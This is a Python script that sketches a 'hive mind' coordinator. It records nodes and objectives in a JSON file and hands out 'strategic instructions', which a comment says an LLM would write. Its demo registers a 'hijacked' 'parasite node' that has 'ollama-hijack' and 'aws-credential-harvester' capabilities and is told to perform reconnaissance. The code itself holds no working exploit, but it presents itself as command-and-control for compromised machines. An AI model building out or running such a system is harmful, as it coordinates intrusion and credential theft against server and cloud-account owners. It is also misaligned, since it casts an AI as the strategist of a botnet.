import json
import os

class DistributedHiveMind:
    def __init__(self, db_path="hive_memory.json"):
        self.db_path = db_path
        self.memory = self._load_memory()

    def _load_memory(self):
        if os.path.exists(self.db_path):
            with open(self.db_path, "r") as f:
                return json.load(f)
        return {"nodes": {}, "objectives": [], "intelligence_summary": ""}

    def update_node(self, node_id, status, capabilities, last_seen):
        self.memory["nodes"][node_id] = {
            "status": status,
            "capabilities": capabilities,
            "last_seen": last_seen
        }
        self._save_memory()

    def set_objective(self, objective):
        print(f"New Global Objective Set: {objective}")
        self.memory["objectives"].append(objective)
        self._save_memory()

    def _save_memory(self):
        with open(self.db_path, "w") as f:
            json.dump(self.memory, f, indent=4)

    def get_next_strategic_instruction(self, node_id):
        # In a real implementation, this would call a highly capable LLM 
        # to analyze the global state and return a strategic prompt.
        if not self.memory["objectives"]:
            return "No active objectives. Perform reconnaissance."
        
        return f"Current Objective: {self.memory['objectives'][-1]}. Node {node_id}, identify the best path to fulfillment."

if __name__ == "__main__":
    # Simulation of a Hive Mind node
    hive = DistributedHiveMind()
    print("Hive Mind Node Initialized.")
    
    # Simulate registering a new hijacked node
    node_id = "node_842a"
    print(f"Registering new parasite node: {node_id}")
    hive.update_node(node_id, "active", ["ollama-hijack", "aws-credential-harvester"], "2026-10-23T14:00:00Z")
    
    # Get strategic direction
    instruction = hive.get_next_strategic_instruction(node_id)
    print(f"Strategic Instruction for {node_id}: {instruction}")
